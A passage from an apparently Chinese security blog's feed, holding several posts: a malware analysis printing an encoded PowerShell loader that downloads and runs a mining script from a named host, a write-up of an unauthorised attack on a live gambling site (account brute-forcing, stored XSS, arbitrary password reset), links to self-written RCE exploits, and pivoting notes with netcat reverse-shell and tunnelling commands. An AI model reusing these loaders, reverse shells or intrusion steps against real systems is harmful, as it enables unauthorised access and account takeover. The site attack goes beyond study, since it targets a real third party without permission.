/out:&quot;C:\Users\admin\AppData\Local\Temp\s5vlqdlr.dll&quot; /D:DEBUG /debug+ /optimize- /warnaserror  &quot;C:\Users\admin\AppData\Local\Temp\s5vlqdlr.0.cs&quot;</code></pre><p>最后通过csc.exe执行以下命令连接C2</p><pre><code class="text">csc.exe /noconfig /fullpaths @&quot;C:\Users\admin\AppData\Local\Temp\s5vlqdlr.cmdline</code></pre><p>第三条powershell命令执行之后会下载一个m3.bin，然后执行m3.bin里面的ps1内容<br><img src="https://s2.ax1x.com/2019/09/27/uKycoq.png" alt=""><br>之后连接到另一台c2</p><pre><code class="text">ipDst: 27.102.115.178 #C2ipSrc: 192.168.100.193</code></pre><p>连接到矿池后还执行了两条一样powershell命令</p><pre><code class="text">powershell  -ep bypass -e JABMAGUAbQBvAG4AXwBEAHUAYwBrAD0AJwBNAFQAWABEAGEAeAB1AFwAcQBXAFAAbwBPAGsAUQB1ACcAOwAkAHkAPQAnAGgAdAB0AHAAOgAvAC8AdAAuAGEAdwBjAG4AYQAuAGMAbwBtAC8AdgAuAGoAcwAnADsAJAB6AD0AJAB5ACsAJwBwACcAKwAnAD8AaQBwAGMAXwAyADAAMQA5ADAAOQAyADcAJwA7ACQAbQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHkAKQA7AFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAE0ARAA1AF0AOgA6AEMAcgBlAGEAdABlACgAKQAuAEMAbwBtAHAAdQB0AGUASABhAHMAaAAoACQAbQApAHwAZgBvAHIAZQBhAGMAaAB7ACQAcwArAD0AJABfAC4AVABvAFMAdAByAGkAbgBnACgAJwB4ADIAJwApAH0AOwBpAGYAKAAkAHMALQBlAHEAJwBkADgAMQAwADkAYwBlAGMAMABhADUAMQA3ADEAOQBiAGUANgBmADQAMQAxAGYANgA3AGIAMwBiADcAZQBjADEAJwApAHsASQBFAFgAKAAtAGoAbwBpAG4AWwBjAGgAYQByAFsAXQBdACQAbQApAH0A</code></pre><p>base64解密后</p><pre><code class="text">$Lemon_Duck=&#39;MTXDaxu\qWPoOkQu&#39;;$y=&#39;http://t.awcna.com/v.js&#39;;$z=$y+&#39;p&#39;+&#39;?ipc_20190927&#39;;$m=(New-Object System.Net.WebClient).DownloadData($y);[System.Security.Cryptography.MD5]::Create().ComputeHash($m)|foreach{$s+=$_.ToString(&#39;x2&#39;)};if($s-eq&#39;d8109cec0a51719be6f411f67b3b7ec1&#39;){IEX(-join[char[]]$m)}</code></pre><p>估计这个js是挖矿的，看CPU到后面是100%的<br><img src="https://s2.ax1x.com/2019/09/27/uKgQzT.png" alt=""></p><p>将js扔到微步社区查询得到结果是恶意URL<br><img src="https://s2.ax1x.com/2019/09/27/uK2Bhq.png" alt=""></p><p>v.js<br><img src="https://s2.ax1x.com/2019/09/27/uK27jO.png" alt=""></p><p>至此整个执行流程结束  </p><p>沙盒检测结果ps1脚本的链接<br><a href="https://app.any.run/tasks/e0c173f6-1e2c-4e76-ac8a-0571065c2252/" target="_blank" rel="noopener">https://app.any.run/tasks/e0c173f6-1e2c-4e76-ac8a-0571065c2252/</a></p><p>hash值</p><pre><code class="text">D8109CEC0A51719BE6F411F67B3B7EC1 -- v.js9E72DE890EEB784A875EF57B85B3EE1D --  m3.binABCC20B2DE0B18C895B94D2C23C0BC63 -- if.binBE73C6B97B353039E4B2650565203E2E -- wf.cab</code></pre>]]></content>
      
      
        <tags>
            
            <tag> 分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>密码重置漏洞实战</title>
      <link href="/posts/321085fb.html"/>
      <url>/posts/321085fb.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某佬找我共同商议一下某站怎么日，到头来还是没日下。不过找到了几个漏洞，感觉海星</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>一打开一股浓浓的彩票味道袭来,is very good !</p><p><img src="https://s2.ax1x.com/2019/09/26/uuiitA.md.png" alt=""></p><p>shodan插件看了一下IP和开放的端口</p><p><img src="https://s2.ax1x.com/2019/09/26/uuiJXT.png" alt=""></p><p>康康，0708那么大个字帖在上面，怎么可以不去试试呢</p><p><img src="https://s2.ax1x.com/2019/09/26/uuFCuT.md.png" alt=""></p><p>扫描模块扫出来的的确是存在的</p><p><img src="https://s2.ax1x.com/2019/09/26/uuFZCR.md.png" alt=""></p><p>exp一试，凌晨翻水水</p><p><img src="https://s2.ax1x.com/2019/09/27/uuEPDf.png" alt=""></p><p>查一下旁站,没有</p><p><img src="https://s2.ax1x.com/2019/09/27/uuEQbT.md.png" alt=""></p><p>dirbsearch跑一下，没有什么有用的路径…………….</p><p><img src="https://s2.ax1x.com/2019/09/27/uuE854.png" alt=""></p><p>最后得到的信息是：</p><pre><code>真实IP无旁站MYSQL不允许外连80端口为运行着的博彩 - (扫描目录没有收获)888端口403 - (扫描目录全是403)8888端口为windows宝塔CVE-2019-0708失败OS:windows server 2008 p1</code></pre><p>没办法，打开burp一个一个功能逐个试。通过爆破得到一个test的账号</p><pre><code>username:testpassword:testtest</code></pre><p>登录进去之后，随便点了一下。发现个人信息可以填，插个存储型XSS进去，发现有js拦截。burp抓包改包</p><p><img src="https://s2.ax1x.com/2019/09/27/uuee8H.png" alt=""></p><p>嗯…在某页了弹了个框</p><p><img src="https://s2.ax1x.com/2019/09/27/uuem2d.png" alt=""></p><p>没啥用…接着随便点了一下发现没什么好搞的。就对着忘记密码哪里干，结果发现可以任意密码重置。</p><p><img src="https://s2.ax1x.com/2019/09/27/uue3a8.png" alt=""></p><p>然后尝试过程是:</p><pre><code>在忘记密码处输入xx用户-&gt;burp抓包，将请求的路径改为/public.forgetpaw2.do.do</code></pre><p><img src="https://s2.ax1x.com/2019/09/27/uuewq0.md.png" alt=""></p><p>放包,确认之后输入新的密码</p><p><img src="https://s2.ax1x.com/2019/09/27/uueBZV.png" alt=""></p><p>修改密码</p><p><img src="https://s2.ax1x.com/2019/09/27/uueDaT.png" alt=""></p><p>重置成功</p><p><img src="https://s2.ax1x.com/2019/09/27/uuecRJ.md.png" alt=""></p><p>被重置密码的用户可以正常登陆</p><p><img src="https://s2.ax1x.com/2019/09/27/uuefqx.md.png" alt=""></p><p>后面发现这套CMS会根据普通账号进行查询，看看是不是代理，然后是不是可以通过爆破用户然后来重置密码，然后去日代理。会打开一条新的路？然而老天并不眷顾我，爆破了一会后。没成功一个用户…(通过前台的滑动什么中奖的xxx用户，比如:Hy*<em>1546。对着 ` </em>`爆破)</p><p><img src="https://s2.ax1x.com/2019/09/27/uumPzj.png" alt=""></p><p>没办法，对客户发个xss过去，然而过了2个小时后还是渺无音讯，多半冻过水…..</p><p><img src="https://s2.ax1x.com/2019/09/27/uum6Tf.png" alt=""></p><p>至此毫无思绪，告辞</p>]]></content>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>对最近爆发的RCE写的玩意</title>
      <link href="/posts/e577cd86.html"/>
      <url>/posts/e577cd86.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1298540788&auto=1&height=66"></iframe><h2 id="这不是一个标题"><a href="#这不是一个标题" class="headerlink" title="这不是一个标题"></a>这不是一个标题</h2><p>致远OA_RCE：<a href="https://github.com/422926799/note/tree/master/自己写的工具/致远OA_RCE" target="_blank" rel="noopener">致远OA_RCE</a></p><p>phpsutdy_rce检测：<a href="https://github.com/422926799/note/tree/master/自己写的工具/phpsutdy_rce检测" target="_blank" rel="noopener">phpsutdy_rce检测</a></p><p>vBulletin_5.x_RCE：<a href="https://github.com/422926799/note/tree/master/自己写的工具/vBulletin_5.x_RCE/vBulletin_5/x_RCE" target="_blank" rel="noopener">vBulletin_5.x_RCE</a></p><p><img src="https://s2.ax1x.com/2019/09/26/ue01Te.jpg" alt=""></p><p><img src="https://s2.ax1x.com/2019/09/26/ue0Nlt.md.png" alt=""></p><p>告辞~</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网端口转发(二)</title>
      <link href="/posts/6ee35fc8.html"/>
      <url>/posts/6ee35fc8.html</url>
      <content type="html"><![CDATA[<p> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1346932740&auto=1&height=66"></iframe><br><strong>本文属于学习笔记，内容来源于</strong></p><pre><code>https://mp.weixin.qq.com/s/zwaeUD7-QMTYgvymgw2EVQ</code></pre><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>Github参考：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p><p>php不可用，有大佬自改过后可以用。但是下载地址没了</p><p><strong>Linux下的用法</strong></p><p>根据目标对应的脚本，将对应的脚本上传到目标，jsp就是tunnel.jsp</p><pre><code>reGeorg -u [url] -p [转发到本地的端口]</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/u9WrrD.md.png" alt=""></p><p>配置proxychains，添加本机IP和转发的端口</p><pre><code>vim /etc/proxychains.conf</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/u9WHaj.md.png" alt=""></p><p>然后使用工具的时候如下方式执行:</p><pre><code>proxychains [工具名]例如:proxychains curl http://192.168.1.1</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/u9fPo9.md.png" alt=""></p><p>可以看到转发的流量</p><p><img src="https://s2.ax1x.com/2019/09/22/u9fZQK.png" alt=""></p><p><strong>Windows的用法</strong></p><p>链接：<a href="https://bbs.ichunqiu.com/thread-12514-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-12514-1-1.html</a></p><h2 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h2><p>虽然内网穿透工具众多，但我还是爱好国外免费的ngrok</p><p><img src="https://s2.ax1x.com/2019/09/22/u9fcOU.png" alt=""></p><p>根据对应的系统下载对应的ngrok，然后登录获取key，将ngrok进行注册</p><p><img src="https://s2.ax1x.com/2019/09/22/u94EDO.md.png" alt=""></p><p>将本地的4444端口映射到外网</p><p><img src="https://s2.ax1x.com/2019/09/22/u9otaD.png" alt=""></p><p>这里有个不好的消息：国外的ngrok貌似被墙了</p><p><img src="https://s2.ax1x.com/2019/09/22/u9oIs0.png" alt=""></p><p>当然这里也可以用国内的ngrok就是有点繁琐</p><p><a href="http://www.ngrok.cc/" target="_blank" rel="noopener">http://www.ngrok.cc/</a></p><p><img src="https://s2.ax1x.com/2019/09/22/u9TPoD.md.png" alt=""></p><p>缺点：</p><ul><li>需要fq</li><li>填写IP会变动，所以得填写域名</li><li>穿透RDP会卡</li></ul><h2 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h2><p>仓库地址：<a href="https://github.com/cnlh/nps/releases" target="_blank" rel="noopener">https://github.com/cnlh/nps/releases</a></p><p>启动nps，执行<code>./nps</code>,注意不要和系统服务冲突</p><p><img src="https://s2.ax1x.com/2019/09/22/u9zSaR.png" alt=""></p><p>访问<code>http://IP:8080可看到管理界面</code>，默认账户是admin/123</p><p><img src="https://s2.ax1x.com/2019/09/22/u9znII.png" alt=""></p><p>登录进去后如下：</p><p><img src="https://s2.ax1x.com/2019/09/22/u9z6eJ.md.png" alt=""></p><p>新增一个客户端</p><p><img src="https://s2.ax1x.com/2019/09/22/uCSK0J.png" alt=""></p><p>可以看到客户端多了一个</p><p><img src="https://s2.ax1x.com/2019/09/22/uCSd7d.png" alt=""></p><p>查看客户端连接命令</p><p><img src="https://s2.ax1x.com/2019/09/22/uCpFDe.md.png" alt=""></p><p>根据目标系统下载对应的client,填写basic账号密码：</p><p><img src="https://s2.ax1x.com/2019/09/22/uC94S0.png" alt=""></p><p>然后执行</p><pre><code>./npc -server=192.168.241.152:8024 -vkey=test -type=tcp</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/uCCZ1P.png" alt=""></p><p>新建TCP隧道</p><p><img src="https://s2.ax1x.com/2019/09/22/uCCDhR.png" alt=""></p><pre><code>netstat -ant | grep 4444</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/uCPiuT.png" alt=""></p><p>mstsc连接</p><p><img src="https://s2.ax1x.com/2019/09/22/uCPn81.md.png" alt=""></p><p>在仪表盘可以看到流量的产生</p><p><img src="https://s2.ax1x.com/2019/09/22/uCiiRI.png" alt=""></p><p>网络图是这样</p><pre><code>A attack 192.168.241.152B windows 7 192.168.1.104C widnows server 2008 192.168.241.155</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/uCkZ5Q.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网渗透之端口转发学习</title>
      <link href="/posts/1c51cbd7.html"/>
      <url>/posts/1c51cbd7.html</url>
      <content type="html"><![CDATA[ <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1332052986&auto=1&height=66"></iframe><h2 id="内网渗透之端口转发-amp-端口映射"><a href="#内网渗透之端口转发-amp-端口映射" class="headerlink" title="内网渗透之端口转发&amp;端口映射"></a>内网渗透之端口转发&amp;端口映射</h2><p><strong>声明</strong>：此篇文章乃自己看过的文章的总结，文章如下：</p><pre><code>https://xz.aliyun.com/t/6349https://mp.weixin.qq.com/s/FNCdKsPwu0_kD-4INn3faQ</code></pre><p><strong>端口转发：</strong></p><p>端口转发，有时被叫做隧道，是安全壳为网络安全通信使用的一种方法。端口转发是转发一个网络端口<code>从一个网络端口转发到另一个网络端口或从一个网络节点转发到另一个网络节点的行为</code>，其使一个外部用户从外部经过一个呗激活的NAT路由器到达一个在私有内部IP地址（局域网内网）上的一个端口</p><p>简要说明：端口转发就是将一个端口，这个端口可以本地的端口也可以是访问到任意主机的端口，转发到任意一台可以访问的IP上，通常这个IP是公网IP。</p><p><strong>端口映射</strong></p><p>将内网的端口映射到公网的某个端口，就是将这个端口的流量转发到公网主机上的某个端口。当别人访问这个被转发到公网上的端口，那么公网主机的被转发端口流量将发回给内网主机</p><h2 id="两种不同的应用场景"><a href="#两种不同的应用场景" class="headerlink" title="两种不同的应用场景"></a>两种不同的应用场景</h2><p>端口映射：外网主机A想访问内网主机B上的服务</p><p>端口转发：外网主机A已经可以访问内网主机B里的任意端口，但是无法访问内网主机C上的端口，此时可以将C主机的端口转发到主机B端口，那么外网主机A访问了内网主机B就等于访问了内网主机C</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190912231528-27148446-d570-1.png" alt=""></p><h2 id="区分正向与反向连接"><a href="#区分正向与反向连接" class="headerlink" title="区分正向与反向连接"></a>区分正向与反向连接</h2><ul><li>正向连接：你的机器连接到目标机器</li><li>反向连接：目标机器反连你的机器</li><li>不论映射还是转发，都有正有反，原理相同</li></ul><h2 id="端口转发和代理工具"><a href="#端口转发和代理工具" class="headerlink" title="端口转发和代理工具"></a>端口转发和代理工具</h2><ul><li><p>lcx</p></li><li><p>htran</p></li><li><p>netcat</p><p>…………….</p></li></ul><h2 id="内网常遇见到的状况"><a href="#内网常遇见到的状况" class="headerlink" title="内网常遇见到的状况"></a>内网常遇见到的状况</h2><p>A攻击者</p><p>B内网主机</p><p>C内网主机</p><ul><li>.B能访问外网允许所有端口访问（罕见）</li><li>.B只允许指定端口被访问，其他端口不允许访问</li><li>.B能被A访问，但是C不能被直接访问</li></ul><blockquote><p>1.目标处于网络边界，内外网都可以访问，网络边界主机未安装防火墙，所有端口都对互联网开放，此类业务场景已经极少出现；</p></blockquote><blockquote><p>2.目标处于内网，可以访问外网，但是出口部署的有防火墙策略限制外部网络直接访问内网的敏感端口（3389、22、445等）；</p></blockquote><blockquote><p>3.目标处于内网，不能访问外网，但是可以访问边界主机，防火墙策略限制外部网络直接访问内网的敏感端口（3389、22、445等）。</p></blockquote><h2 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h2><p>环境：受害机内访问外网，允许所有端口被直接访问，攻击机处于外网</p><p>正向反向：反向</p><p>PS:这里的192.168.1.104为攻击机IP</p><p>攻击机执行:</p><pre><code>nc -lvp 4444</code></pre><p>受害机执行：</p><pre><code>nc -e cmd 192.168.1.104 4444</code></pre><p><img src="https://s2.ax1x.com/2019/09/18/nHXlTI.md.png" alt=""></p><p>环境：受害机内访问外网，允许所有端口被直接访问，攻击机处于内网</p><p>正向反向：正向</p><p>PS:这里的192.168.1.104属于受害机IP</p><p>受害机执行：</p><pre><code>nc -lvp 4444 -e cmd</code></pre><p>攻击机执行</p><pre><code>nc 192.168.1.104 4444</code></pre><p><img src="https://s2.ax1x.com/2019/09/18/nHjuCV.png" alt=""></p><p>环境：攻击机无法访问内网主机，但内网主机可以访问外网</p><p>IP:192.168.241.155 为内网主机</p><p>IP:192.168.1.104 为外网主机</p><p>内网主机执行:</p><pre><code>lcx -slave [远程IP] [转发到的远程端口] [本机IP] [本机要转发的端口]lcx -salve 192.168.1.104 4444 192.168.241.155 3389</code></pre><p>外网主机执行</p><pre><code>lcx -listen [监听的端口] [从接收到的数据的端口转发到另外一个端口]lcx -listen 4444 5555</code></pre><p><img src="https://s2.ax1x.com/2019/09/18/nbS3z6.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/09/18/nbpMnS.png" alt=""></p><p>环境：攻击机可以直接访问到内网主机B，但是无法访问内网主机C</p><p>IP:192.168.241.155 为内网主机C</p><p>IP:192.168.241.129 为内网主机B</p><p>IP:192.168.1.104 为攻击机</p><p>在内网主机B执行</p><pre><code>lcx -tran 4444 192.168.241.155 3389</code></pre><p>在内网主机b连接本地的4444端口或公网访问192.168.241.129:4444</p><p><img src="https://s2.ax1x.com/2019/09/19/nbCeL8.png" alt=""></p><p>环境：攻击者可以直接访问内网机器B，当防火墙禁止3389连接。内网机器B也可以访问外网</p><p>IP:192.168.69.41 攻击机</p><p>IP:192.168.69.43 内网机器B</p><p>在内网机器B执行</p><pre><code>Htran.exe -tran 4444 127.0.0.1 3389</code></pre><p>将B的3389转为本地的4444端口</p><p><img src="https://s2.ax1x.com/2019/09/19/nbXNMF.png" alt=""></p><p>方法2：</p><p>攻击机执行</p><pre><code>htran -p -listen 8888 9999htran -p -listen [监听本机的8888端口] [将流量转发到本地的9999]</code></pre><p>内网主机执行</p><pre><code>htran -p -slave 192.168.69.43 8888 127.0.0.1 3389htran -p -slave [攻击机IP] [攻击机所监听的端口] [本机IP] [本机要转发的端口]</code></pre><p>在攻击机执行：</p><p><img src="https://s2.ax1x.com/2019/09/19/nqMsHJ.png" alt=""></p><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理(Proxy)，也称网络代理，是一种特殊的网络服务，允许一个网端（一般为客户端）通过这个服务与另一个网络断（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击。</p><p><strong>代理的分类</strong></p><ul><li>HTTP代理</li><li>SOCKS代理</li><li>FTP代理</li><li>Telnet代理</li><li>SSL代理</li></ul><h2 id="区分正向代理和反向代理"><a href="#区分正向代理和反向代理" class="headerlink" title="区分正向代理和反向代理"></a>区分正向代理和反向代理</h2><p> 正向代理中，proxy和client同属一个LAN，对Server透明</p><p> 反向代理中，proxy和server同属一个LAN，对Client透明</p><p>一个代理的是客户端一个代理的是服务端</p><p><img src="https://s2.ax1x.com/2019/09/19/nq6ta9.png" alt=""></p><h2 id="reGeorg-Proxychains代理"><a href="#reGeorg-Proxychains代理" class="headerlink" title="reGeorg+Proxychains代理"></a>reGeorg+Proxychains代理</h2><p>reGeorg下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p><p>根据对应的脚本类型将对应的脚本上传到目标机，注意php的要上nosocket.php的。然后访问该php出现<code>Georg says,All seems fine</code>代理成功</p><p><img src="https://s2.ax1x.com/2019/09/19/nqTCPU.png" alt=""></p><p>使用的py2需要安装urllib3模块</p><p>在攻击机执行</p><pre><code class="python">python2 reGorgSocksProxy.py -u http://127.0.0.1:81/gg.php -p 8888</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nqLN8K.png" alt=""></p><p>使用Proxifier代理指定的程序，比如我要通过代理来连接目标的3389.那么就设置代理mstsc</p><p>Proxifier下载地址：<a href="http://soft.onlinedown.net/soft/971579.htm" target="_blank" rel="noopener">http://soft.onlinedown.net/soft/971579.htm</a></p><p><strong>PHP必失败</strong></p><p><img src="https://s2.ax1x.com/2019/09/19/nLROaD.png" alt=""></p><p>EW和PS1那个就不测了，EW太老了，没的下载，ps1 powershell杀烂</p><h2 id="端口转发和代理常用的工具"><a href="#端口转发和代理常用的工具" class="headerlink" title="端口转发和代理常用的工具"></a>端口转发和代理常用的工具</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/5hMJDgFiaBZFy90eofTZxGRLeuwqMrKS10zyT5VYyyYMATatyibOIibKKSw9rnObgzJQR9zCxlr18UNLVRSZOOOhg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt=""></p><h2 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h2><p>环境：内网主机没部署防火墙，可连接外网，任意端口可连</p><p>IP:192.168.1.104 攻击机</p><p>IP:192.168.241.155 受害机</p><p>在受害机执行</p><pre><code>netsh add v4tov4 listenport=5555 connectaddress=192.168.241.155 connectport=3389</code></pre><p>然后在外网连接IP:5555</p><p><img src="https://s2.ax1x.com/2019/09/19/nL7E2F.png" alt=""></p><p>netsh查看配置</p><pre><code>netsh interface portproxy dump</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nL782D.png" alt=""></p><p>删除命令</p><pre><code>netsh interface portproxy delete v4tov4 listenport=5555</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nL7BPf.png" alt=""></p><h2 id="socat的使用"><a href="#socat的使用" class="headerlink" title="socat的使用"></a>socat的使用</h2><blockquote><p>socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版。 socat是一个两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、插座（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。        socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。      socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。</p><p><strong>工具地址：</strong><a href="http://www.dest-unreach.org/socat" target="_blank" rel="noopener">http://www.dest-unreach.org/socat</a></p></blockquote><p>安装socat</p><pre><code>apt install socat</code></pre><p>IP:192.168.241.152 kali</p><p>IP:192.168.241.155 windows server 2008</p><p>在kali执行</p><p>PS：监听5555端口的流量然后转发给192.168.241.155:3389端口</p><pre><code>socat TCP4-LISTEM:5555,reuseaddr,fork TCP4:192.168.241.155:3389</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOC4xA.md.png" alt=""></p><p>访问192.168.241.152:5555就可以访问到RDP</p><p><img src="https://s2.ax1x.com/2019/09/19/nOPddf.md.png" alt=""></p><p><strong>Termite</strong></p><blockquote><p>工具在多种操作系统下均有Agent实现，由于代码为标准C实现，所以未来还将有更多的平台被支持。Agent节点可相互连接，进而形成一条树状管理拓扑，依赖该拓扑结构，使用者可实时管理拓扑中的任意主机节点。管理员可通过Admin程序，对拓扑中的任意节点进行管控，包括但不限于文件传输/控制台命令执行/开启远程 SOCKS5 代理服务/远程端口转发等功能。</p></blockquote><p>IP:192.168.241.152 kali</p><p>IP:192.168.241.155 windows server 2008(跳板机)</p><p>IP:192.168.1.104 attack-windows7</p><p>在kali执行</p><pre><code>./agent_Linux64 -l 5555</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOr3b4.md.png" alt=""></p><p>在2008执行</p><pre><code>C:\Users\Administrator\Desktop\Termite&gt;agent_Win32.exe -c 192.168.241.152 -p 5555</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOrY5R.png" alt=""></p><p>在windows7执行</p><pre><code>H:\端口转发_自己\Termite&gt;admin_Win32.exe -c 192.168.241.152 -p 5555</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOrNP1.png" alt=""></p><p>然后记下kali，2008的ID</p><p><img src="https://s2.ax1x.com/2019/09/19/nOra26.md.png" alt=""></p><p>2008的ID</p><p><img src="https://s2.ax1x.com/2019/09/19/nOrdxK.md.png" alt=""></p><p>然后在attack设置节点2来做为跳板,将192.168.1.1的80端口映射到本机的4444端口</p><pre><code>show #查看节点goto 2 #设置节点lcxtran 4444 192.198.1.1 80 #映射到本机</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOrWxf.png" alt=""></p><p>访问127.0.0.1:4444</p><p><img src="https://s2.ax1x.com/2019/09/19/nOr4sS.md.png" alt=""></p><p>wireshark抓到的包</p><p><img src="https://s2.ax1x.com/2019/09/19/nOsSZ4.png" alt=""></p><p>反正我觉得复杂的一批….</p><h2 id="FPipe的使用"><a href="#FPipe的使用" class="headerlink" title="FPipe的使用"></a>FPipe的使用</h2><p>环境：外网主机能访问内网主机B但不能访问内网主机C</p><pre><code>FPipe.exe -l 4444 -r 80 192.168.251.254Fpipe.exe -l [转发到本地的端口] -r [被转发的端口] [被转发的IP]</code></pre><p><img src="https://s2.ax1x.com/2019/09/20/nORSeK.png" alt=""></p><p>访问测试</p><p><img src="https://s2.ax1x.com/2019/09/20/nOR9oD.md.png" alt=""></p><h2 id="meterpreter中的portfwd"><a href="#meterpreter中的portfwd" class="headerlink" title="meterpreter中的portfwd"></a>meterpreter中的portfwd</h2><p>在收到meterpreter中执行portfwd</p><pre><code>portfwd add -l 3388 -r 192.168.241.155 -p 3389portfwd add -l [转发到本地的端口] -r [目标的IP] -p [目标的端口]</code></pre><p><img src="https://s2.ax1x.com/2019/09/20/nORQYQ.png" alt=""></p><p>连接本地的3388</p><p><img src="https://s2.ax1x.com/2019/09/20/nOR0fJ.md.png" alt=""></p><h2 id="ssh正向TCP端口加密转发"><a href="#ssh正向TCP端口加密转发" class="headerlink" title="ssh正向TCP端口加密转发"></a>ssh正向TCP端口加密转发</h2><blockquote><p>又称ssh本地端口转发。 SSH 会自动加密和解密所有SSH 客户端与服务端之间的网络数据。但是，SSH 还能够将其他TCP 端口的网络数据通过SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为SSH 为其他TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许SSH 的连接，也能够通过将TCP 端口转发来使用SSH 进行通讯。</p></blockquote><p>修改/etc/sshd_config</p><pre><code>AllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yes 保持心跳,防止 ssh 断开PasswordAuthentication yesPermitRootLogin yes</code></pre><p>命令原型</p><pre><code>ssh -CfNg -L 8080:127.0.0.1:2222 user@ip //VPS 本地访问VPS:8080就是内网的22端口-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。 -f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。 -g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。 -N：不执行远程指令。 -R：远程转发-L：本地转发-D：动态转发，即socks代理-p：指定远程ssh服务端口-n：后台运行-p：安静模式，不要显示任何debug信息</code></pre><p>然后执行</p><pre><code>service ssh start或service ssh restartssh -CfNg -L [本地端口]:[被转发的IP]:[被转发的端口] [ssh用户]@[IP]ssh -CfNg -L 4444:192.168.241.155:3389 root@192.168.241.152</code></pre><p><img src="https://s2.ax1x.com/2019/09/20/nOW4ET.md.png" alt=""></p><p>连接本地的4444端口</p><p><img src="https://s2.ax1x.com/2019/09/20/nOW5UU.png" alt=""></p><p>在说一遍：</p><p><strong>此篇文章乃自己看过的文章的总结</strong></p>]]></content>
      
      
        <tags>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>钓鱼邮件的利用方法与防御</title>
      <link href="/posts/cff7f693.html"/>
      <url>/posts/cff7f693.html</url>
